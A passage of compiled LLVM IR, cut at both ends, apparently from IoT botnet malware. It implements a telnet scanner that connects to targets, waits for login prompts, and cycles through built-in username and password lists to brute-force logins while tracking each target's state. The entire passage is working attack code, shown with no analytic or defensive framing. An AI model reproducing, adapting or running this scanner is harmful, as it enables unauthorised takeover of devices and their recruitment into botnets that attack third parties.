  %104 = load i64, i64* %103, align 8
  %105 = or i64 %100, %104
  store i64 %105, i64* %103, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %2, align 16
  %106 = add nsw i32 %97, 1
  %107 = call i32 @select(i32 %106, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %107, label %127 [
    i32 1, label %108
    i32 -1, label %123
  ]

; <label>:108:                                    ; preds = %94
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %109 = load i32, i32* %96, align 16
  %110 = call i32 @getsockopt(i32 %109, i32 1, i32 4, i8* nonnull %32, i32* nonnull %3) #3
  %111 = load i32, i32* %4, align 4
  %112 = icmp eq i32 %111, 0
  %113 = load i32, i32* %96, align 16
  br i1 %112, label %116, label %114

; <label>:114:                                    ; preds = %108
  %115 = call i32 @sclose(i32 %113)
  br label %.sink.split

; <label>:116:                                    ; preds = %108
  %117 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null) #3
  %118 = and i32 %117, -2049
  %119 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 4, i32 %118) #3
  store i32 0, i32* %88, align 4
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 7
  store i16 0, i16* %120, align 16
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 8
  %122 = load i8*, i8** %121, align 8
  call void @llvm.memset.p0i8.i64(i8* %122, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %35, align 8
  br label %726

; <label>:123:                                    ; preds = %94
  %124 = load i32, i32* %96, align 16
  %125 = call i32 @sclose(i32 %124)
  br label %.sink.split

.sink.split:                                      ; preds = %114, %123
  store i8 0, i8* %35, align 8
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %126, align 1
  br label %127

; <label>:127:                                    ; preds = %94, %.sink.split
  %128 = load i32, i32* %88, align 4
  %129 = add i32 %128, 10
  %130 = zext i32 %129 to i64
  %131 = call i64 @time(i64* null) #3
  %132 = icmp slt i64 %130, %131
  br i1 %132, label %133, label %726

; <label>:133:                                    ; preds = %127
  %134 = load i32, i32* %96, align 16
  %135 = call i32 @sclose(i32 %134)
  store i8 0, i8* %35, align 8
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %136, align 1
  br label %726

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 6
  %139 = load i32, i32* %138, align 4
  %140 = icmp eq i32 %139, 0
  br i1 %140, label %141, label %144

; <label>:141:                                    ; preds = %137
  %142 = call i64 @time(i64* null) #3
  %143 = trunc i64 %142 to i32
  store i32 %143, i32* %138, align 4
  br label %144

; <label>:144:                                    ; preds = %141, %137
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %146 = load i32, i32* %145, align 16
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 8
  %148 = load i8*, i8** %147, align 8
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 7
  %150 = load i16, i16* %149, align 16
  %151 = zext i16 %150 to i32
  %152 = call i32 @readUntil(i32 %146, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %148, i32 1024, i32 %151)
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %161, label %154

; <label>:154:                                    ; preds = %144
  store i32 0, i32* %138, align 4
  store i16 0, i16* %149, align 16
  %155 = load i8*, i8** %147, align 8
  %156 = call i8* @strstr(i8* %155, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %157 = icmp eq i8* %156, null
  br i1 %157, label %159, label %158

; <label>:158:                                    ; preds = %154
  store i8 5, i8* %35, align 8
  br label %160

; <label>:159:                                    ; preds = %154
  call void @llvm.memset.p0i8.i64(i8* %155, i8 0, i64 1024, i32 1, i1 false)
  br label %160

; <label>:160:                                    ; preds = %159, %158
  store i8 3, i8* %35, align 8
  br label %726

; <label>:161:                                    ; preds = %144
  %162 = load i32, i32* %145, align 16
  %163 = load i8*, i8** %147, align 8
  %164 = load i16, i16* %149, align 16
  %165 = zext i16 %164 to i32
  %166 = call i32 @readUntil(i32 %162, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %163, i32 1024, i32 %165)
  %167 = icmp eq i32 %166, 0
  br i1 %167, label %175, label %168

; <label>:168:                                    ; preds = %161
  store i32 0, i32* %138, align 4
  store i16 0, i16* %149, align 16
  %169 = load i8*, i8** %147, align 8
  %170 = call i8* @strstr(i8* %169, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %171 = icmp eq i8* %170, null
  br i1 %171, label %173, label %172

; <label>:172:                                    ; preds = %168
  store i8 5, i8* %35, align 8
  br label %174

; <label>:173:                                    ; preds = %168
  call void @llvm.memset.p0i8.i64(i8* %169, i8 0, i64 1024, i32 1, i1 false)
  br label %174

; <label>:174:                                    ; preds = %173, %172
  store i8 3, i8* %35, align 8
  br label %726

; <label>:175:                                    ; preds = %161
  %176 = load i32, i32* %145, align 16
  %177 = load i8*, i8** %147, align 8
  %178 = load i16, i16* %149, align 16
  %179 = zext i16 %178 to i32
  %180 = call i32 @readUntil(i32 %176, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %177, i32 1024, i32 %179)
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %189, label %182

; <label>:182:                                    ; preds = %175
  store i32 0, i32* %138, align 4
  store i16 0, i16* %149, align 16
  %183 = load i8*, i8** %147, align 8
  %184 = call i8* @strstr(i8* %183, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %185 = icmp eq i8* %184, null
  br i1 %185, label %187, label %186

; <label>:186:                                    ; preds = %182
  store i8 5, i8* %35, align 8
  br label %188

; <label>:187:                                    ; preds = %182
  call void @llvm.memset.p0i8.i64(i8* %183, i8 0, i64 1024, i32 1, i1 false)
  br label %188

; <label>:188:                                    ; preds = %187, %186
  store i8 3, i8* %35, align 8
  br label %726

; <label>:189:                                    ; preds = %175
  %190 = load i32, i32* %145, align 16
  %191 = load i8*, i8** %147, align 8
  %192 = load i16, i16* %149, align 16
  %193 = zext i16 %192 to i32
  %194 = call i32 @readUntil(i32 %190, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %191, i32 1024, i32 %193)
  %195 = icmp eq i32 %194, 0
  br i1 %195, label %203, label %196

; <label>:196:                                    ; preds = %189
  store i32 0, i32* %138, align 4
  store i16 0, i16* %149, align 16
  %197 = load i8*, i8** %147, align 8
  %198 = call i8* @strstr(i8* %197, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %199 = icmp eq i8* %198, null
  br i1 %199, label %201, label %200

; <label>:200:                                    ; preds = %196
  store i8 5, i8* %35, align 8
  br label %202

; <label>:201:                                    ; preds = %196
  call void @llvm.memset.p0i8.i64(i8* %197, i8 0, i64 1024, i32 1, i1 false)
  br label %202

; <label>:202:                                    ; preds = %201, %200
  store i8 3, i8* %35, align 8
  br label %726

; <label>:203:                                    ; preds = %189
  %204 = load i32, i32* %145, align 16
  %205 = load i8*, i8** %147, align 8
  %206 = load i16, i16* %149, align 16
  %207 = zext i16 %206 to i32
  %208 = call i32 @readUntil(i32 %204, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %205, i32 1024, i32 %207)
  %209 = icmp eq i32 %208, 0
  br i1 %209, label %217, label %210

; <label>:210:                                    ; preds = %203
  store i32 0, i32* %138, align 4
  store i16 0, i16* %149, align 16
  %211 = load i8*, i8** %147, align 8
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %213 = icmp eq i8* %212, null
  br i1 %213, label %215, label %214

; <label>:214:                                    ; preds = %210
  store i8 5, i8* %35, align 8
  br label %216

; <label>:215:                                    ; preds = %210
  call void @llvm.memset.p0i8.i64(i8* %211, i8 0, i64 1024, i32 1, i1 false)
  br label %216

; <label>:216:                                    ; preds = %215, %214
  store i8 3, i8* %35, align 8
  br label %726

; <label>:217:                                    ; preds = %203
  %218 = load i8*, i8** %147, align 8
  %219 = call i64 @strlen(i8* %218) #15
  %220 = trunc i64 %219 to i16
  store i16 %220, i16* %149, align 16
  %221 = load i32, i32* %138, align 4
  %222 = add i32 %221, 10
  %223 = zext i32 %222 to i64
  %224 = call i64 @time(i64* null) #3
  %225 = icmp slt i64 %223, %224
  br i1 %225, label %226, label %726

; <label>:226:                                    ; preds = %217
  %227 = load i32, i32* %145, align 16
  %228 = call i32 @sclose(i32 %227)
  store i8 0, i8* %35, align 8
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %229, align 1
  br label %726

; <label>:230:                                    ; preds = %.lr.ph
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %232 = load i32, i32* %231, align 16
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 4
  %234 = load i8, i8* %233, align 2
  %235 = zext i8 %234 to i64
  %236 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %235
  %237 = load i8*, i8** %236, align 8
  %238 = call i64 @strlen(i8* %237) #15
  %239 = call i64 @send(i32 %232, i8* %237, i64 %238, i32 16384) #3
  %240 = icmp slt i64 %239, 0
  %241 = load i32, i32* %231, align 16
  br i1 %240, label %242, label %245

; <label>:242:                                    ; preds = %230
  %243 = call i32 @sclose(i32 %241)
  store i8 0, i8* %35, align 8
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %244, align 1
  br label %726

; <label>:245:                                    ; preds = %230
  %246 = call i64 @send(i32 %241, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %247 = icmp slt i64 %246, 0
  br i1 %247, label %248, label %252

; <label>:248:                                    ; preds = %245
  %249 = load i32, i32* %231, align 16
  %250 = call i32 @sclose(i32 %249)
  store i8 0, i8* %35, align 8
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %251, align 1
  br label %726

; <label>:252:                                    ; preds = %245
  store i8 4, i8* %35, align 8
  br label %726

; <label>:253:                                    ; preds = %.lr.ph
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 6
  %255 = load i32, i32* %254, align 4
  %256 = icmp eq i32 %255, 0
  br i1 %256, label %257, label %260

; <label>:257:                                    ; preds = %253
  %258 = call i64 @time(i64* null) #3
  %259 = trunc i64 %258 to i32
  store i32 %259, i32* %254, align 4
  br label %260

; <label>:260:                                    ; preds = %257, %253
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %262 = load i32, i32* %261, align 16
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 8
  %264 = load i8*, i8** %263, align 8
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 7
  %266 = load i16, i16* %265, align 16
  %267 = zext i16 %266 to i32
  %268 = call i32 @readUntil(i32 %262, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %264, i32 1024, i32 %267)
  %269 = icmp eq i32 %268, 0
  br i1 %269, label %274, label %270

; <label>:270:                                    ; preds = %260
  store i32 0, i32* %254, align 4
  store i16 0, i16* %265, align 16
  %271 = load i8*, i8** %263, align 8
  %272 = call i8* @strstr(i8* %271, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #15
  %273 = icmp ne i8* %272, null
  %.sink = select i1 %273, i8 5, i8 7
  store i8 %.sink, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %271, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:274:                                    ; preds = %260
  %275 = load i32, i32* %261, align 16
  %276 = load i8*, i8** %263, align 8
  %277 = load i16, i16* %265, align 16
  %278 = zext i16 %277 to i32
  %279 = call i32 @readUntil(i32 %275, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %276, i32 1024, i32 %278)
  %280 = icmp eq i32 %279, 0
  br i1 %280, label %285, label %281

; <label>:281:                                    ; preds = %274
  store i32 0, i32* %254, align 4
  store i16 0, i16* %265, align 16
  %282 = load i8*, i8** %263, align 8
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0)) #15
  %284 = icmp ne i8* %283, null
  %.sink1 = select i1 %284, i8 5, i8 7
  store i8 %.sink1, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %282, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:285:                                    ; preds = %274
  %286 = load i8*, i8** %263, align 8
  %287 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %288 = icmp eq i8* %287, null
  br i1 %288, label %293, label %289

; <label>:289:                                    ; preds = %285
  %290 = load i32, i32* %261, align 16
  %291 = call i32 @sclose(i32 %290)
  store i8 0, i8* %35, align 8
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %292, align 1
  br label %726

; <label>:293:                                    ; preds = %285
  %294 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %295 = icmp eq i8* %294, null
  br i1 %295, label %300, label %296

; <label>:296:                                    ; preds = %293
  %297 = load i32, i32* %261, align 16
  %298 = call i32 @sclose(i32 %297)
  store i8 0, i8* %35, align 8
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %299, align 1
  br label %726

; <label>:300:                                    ; preds = %293
  %301 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %302 = icmp eq i8* %301, null
  br i1 %302, label %307, label %303

; <label>:303:                                    ; preds = %300
  %304 = load i32, i32* %261, align 16
  %305 = call i32 @sclose(i32 %304)
  store i8 0, i8* %35, align 8
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %306, align 1
  br label %726

; <label>:307:                                    ; preds = %300
  %308 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %309 = icmp eq i8* %308, null
  br i1 %309, label %314, label %310

; <label>:310:                                    ; preds = %307
  %311 = load i32, i32* %261, align 16
  %312 = call i32 @sclose(i32 %311)
  store i8 0, i8* %35, align 8
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %313, align 1
  br label %726

; <label>:314:                                    ; preds = %307
  %315 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %316 = icmp eq i8* %315, null
  br i1 %316, label %321, label %317

; <label>:317:                                    ; preds = %314
  %318 = load i32, i32* %261, align 16
  %319 = call i32 @sclose(i32 %318)
  store i8 0, i8* %35, align 8
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %320, align 1
  br label %726

; <label>:321:                                    ; preds = %314
  %322 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %323 = icmp eq i8* %322, null
  br i1 %323, label %328, label %324

; <label>:324:                                    ; preds = %321
  %325 = load i32, i32* %261, align 16
  %326 = call i32 @sclose(i32 %325)
  store i8 0, i8* %35, align 8
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %327, align 1
  br label %726

; <label>:328:                                    ; preds = %321
  %329 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %330 = icmp eq i8* %329, null
  br i1 %330, label %335, label %331

; <label>:331:                                    ; preds = %328
  %332 = load i32, i32* %261, align 16
  %333 = call i32 @sclose(i32 %332)
  store i8 0, i8* %35, align 8
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %334, align 1
  br label %726

; <label>:335:                                    ; preds = %328
  %336 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %337 = icmp eq i8* %336, null
  br i1 %337, label %342, label %338

; <label>:338:                                    ; preds = %335
  %339 = load i32, i32* %261, align 16
  %340 = call i32 @sclose(i32 %339)
  store i8 0, i8* %35, align 8
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %341, align 1
  br label %726

; <label>:342:                                    ; preds = %335
  %343 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %344 = icmp eq i8* %343, null
  br i1 %344, label %349, label %345

; <label>:345:                                    ; preds = %342
  %346 = load i32, i32* %261, align 16
  %347 = call i32 @sclose(i32 %346)
  store i8 0, i8* %35, align 8
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %348, align 1
  br label %726

; <label>:349:                                    ; preds = %342
  %350 = call i64 @strlen(i8* %286) #15
  %351 = trunc i64 %350 to i16
  store i16 %351, i16* %265, align 16
  %352 = load i32, i32* %254, align 4
  %353 = add i32 %352, 10
  %354 = zext i32 %353 to i64
  %355 = call i64 @time(i64* null) #3
  %356 = icmp slt i64 %354, %355
  br i1 %356, label %357, label %726

; <label>:357:                                    ; preds = %349
  %358 = load i32, i32* %261, align 16
  %359 = call i32 @sclose(i32 %358)
  store i8 0, i8* %35, align 8
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %360, align 1
  br label %726

; <label>:361:                                    ; preds = %.lr.ph
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %363 = load i32, i32* %362, align 16
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 5
  %365 = load i8, i8* %364, align 1
  %366 = zext i8 %365 to i64
  %367 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %366
  %368 = load i8*, i8** %367, align 8
  %369 = call i64 @strlen(i8* %368) #15
  %370 = call i64 @send(i32 %363, i8* %368, i64 %369, i32 16384) #3
  %371 = icmp slt i64 %370, 0
  %372 = load i32, i32* %362, align 16
  br i1 %371, label %373, label %376

; <label>:373:                                    ; preds = %361
  %374 = call i32 @sclose(i32 %372)
  store i8 0, i8* %35, align 8
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %375, align 1
  br label %726

; <label>:376:                                    ; preds = %361
  %377 = call i64 @send(i32 %372, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %378 = icmp slt i64 %377, 0
  br i1 %378, label %379, label %383

; <label>:379:                                    ; preds = %376
  %380 = load i32, i32* %362, align 16
  %381 = call i32 @sclose(i32 %380)
  store i8 0, i8* %35, align 8
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %382, align 1
  br label %726

; <label>:383:                                    ; preds = %376
  store i8 6, i8* %35, align 8
  br label %726

; <label>:384:                                    ; preds = %.lr.ph
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 6
  %386 = load i32, i32* %385, align 4
  %387 = icmp eq i32 %386, 0
  br i1 %387, label %388, label %391

; <label>:388:                                    ; preds = %384
  %389 = call i64 @time(i64* null) #3
  %390 = trunc i64 %389 to i32
  store i32 %390, i32* %385, align 4
  br label %391

; <label>:391:                                    ; preds = %388, %384
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %393 = load i32, i32* %392, align 16
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 8
  %395 = load i8*, i8** %394, align 8
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 7
  %397 = load i16, i16* %396, align 16
  %398 = zext i16 %397 to i32
  %399 = call i32 @readUntil(i32 %393, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %395, i32 1024, i32 %398)
  %400 = icmp eq i32 %399, 0
  br i1 %400, label %417, label %401

; <label>:401:                                    ; preds = %391
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %402 = load i8*, i8** %394, align 8
  %403 = call i8* @strstr(i8* %402, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %404 = icmp eq i8* %403, null
  br i1 %404, label %409, label %405

; <label>:405:                                    ; preds = %401
  call void @llvm.memset.p0i8.i64(i8* %402, i8 0, i64 1024, i32 1, i1 false)
  %406 = load i32, i32* %392, align 16
  %407 = call i32 @sclose(i32 %406)
  store i8 0, i8* %35, align 8
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %408, align 1
  br label %726

; <label>:409:                                    ; preds = %401
  %410 = call i32 @matchPrompt(i8* %402)
  %411 = icmp eq i32 %410, 0
  br i1 %411, label %412, label %416

; <label>:412:                                    ; preds = %409
  call void @llvm.memset.p0i8.i64(i8* %402, i8 0, i64 1024, i32 1, i1 false)
  %413 = load i32, i32* %392, align 16
  %414 = call i32 @sclose(i32 %413)
  store i8 0, i8* %35, align 8
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %415, align 1
  br label %726

; <label>:416:                                    ; preds = %409
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %402, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:417:                                    ; preds = %391
  %418 = load i32, i32* %392, align 16
  %419 = load i8*, i8** %394, align 8
  %420 = load i16, i16* %396, align 16
  %421 = zext i16 %420 to i32
  %422 = call i32 @readUntil(i32 %418, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %419, i32 1024, i32 %421)
  %423 = icmp eq i32 %422, 0
  br i1 %423, label %440, label %424

; <label>:424:                                    ; preds = %417
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %425 = load i8*, i8** %394, align 8
  %426 = call i8* @strstr(i8* %425, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %427 = icmp eq i8* %426, null
  br i1 %427, label %432, label %428

; <label>:428:                                    ; preds = %424
  call void @llvm.memset.p0i8.i64(i8* %425, i8 0, i64 1024, i32 1, i1 false)
  %429 = load i32, i32* %392, align 16
  %430 = call i32 @sclose(i32 %429)
  store i8 0, i8* %35, align 8
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %431, align 1
  br label %726

; <label>:432:                                    ; preds = %424
  %433 = call i32 @matchPrompt(i8* %425)
  %434 = icmp eq i32 %433, 0
  br i1 %434, label %435, label %439

; <label>:435:                                    ; preds = %432
  call void @llvm.memset.p0i8.i64(i8* %425, i8 0, i64 1024, i32 1, i1 false)
  %436 = load i32, i32* %392, align 16
  %437 = call i32 @sclose(i32 %436)
  store i8 0, i8* %35, align 8
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %438, align 1
  br label %726

; <label>:439:                                    ; preds = %432
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %425, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:440:                                    ; preds = %417
  %441 = load i32, i32* %392, align 16
  %442 = load i8*, i8** %394, align 8
  %443 = load i16, i16* %396, align 16
  %444 = zext i16 %443 to i32
  %445 = call i32 @readUntil(i32 %441, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %442, i32 1024, i32 %444)
  %446 = icmp eq i32 %445, 0
  br i1 %446, label %456, label %447

; <label>:447:                                    ; preds = %440
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %448 = load i8*, i8** %394, align 8
  %449 = call i8* @strstr(i8* %448, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %450 = icmp eq i8* %449, null
  br i1 %450, label %455, label %451

; <label>:451:                                    ; preds = %447
  call void @llvm.memset.p0i8.i64(i8* %448, i8 0, i64 1024, i32 1, i1 false)
  %452 = load i32, i32* %392, align 16
  %453 = call i32 @sclose(i32 %452)
  store i8 0, i8* %35, align 8
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %454, align 1
  br label %726

; <label>:455:                                    ; preds = %447
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %448, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:456:                                    ; preds = %440
  %457 = load i32, i32* %392, align 16
  %458 = load i8*, i8** %394, align 8
  %459 = load i16, i16* %396, align 16
  %460 = zext i16 %459 to i32
  %461 = call i32 @readUntil(i32 %457, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %458, i32 1024, i32 %460)
  %462 = icmp eq i32 %461, 0
  br i1 %462, label %472, label %463

; <label>:463:                                    ; preds = %456
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %464 = load i8*, i8** %394, align 8
  %465 = call i8* @strstr(i8* %464, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %466 = icmp eq i8* %465, null
  br i1 %466, label %471, label %467

; <label>:467:                                    ; preds = %463
  call void @llvm.memset.p0i8.i64(i8* %464, i8 0, i64 1024, i32 1, i1 false)
  %468 = load i32, i32* %392, align 16
  %469 = call i32 @sclose(i32 %468)
  store i8 0, i8* %35, align 8
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %470, align 1
  br label %726

; <label>:471:                                    ; preds = %463
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %464, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:472:                                    ; preds = %456
  %473 = load i32, i32* %392, align 16
  %474 = load i8*, i8** %394, align 8
  %475 = load i16, i16* %396, align 16
  %476 = zext i16 %475 to i32
  %477 = call i32 @readUntil(i32 %473, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %474, i32 1024, i32 %476)
  %478 = icmp eq i32 %477, 0
  br i1 %478, label %488, label %479

; <label>:479:                                    ; preds = %472
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %480 = load i8*, i8** %394, align 8
  %481 = call i8* @strstr(i8* %480, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %482 = icmp eq i8* %481, null
  br i1 %482, label %487, label %483

; <label>:483:                                    ; preds = %479
  call void @llvm.memset.p0i8.i64(i8* %480, i8 0, i64 1024, i32 1, i1 false)
  %484 = load i32, i32* %392, align 16
  %485 = call i32 @sclose(i32 %484)
  store i8 0, i8* %35, align 8
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %486, align 1
  br label %726

; <label>:487:                                    ; preds = %479
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %480, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:488:                                    ; preds = %472
  %489 = load i32, i32* %392, align 16
  %490 = load i8*, i8** %394, align 8
  %491 = load i16, i16* %396, align 16
  %492 = zext i16 %491 to i32
  %493 = call i32 @readUntil(i32 %489, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %490, i32 1024, i32 %492)
  %494 = icmp eq i32 %493, 0
  br i1 %494, label %504, label %495

; <label>:495:                                    ; preds = %488
  store i32 0, i32* %385, align 4
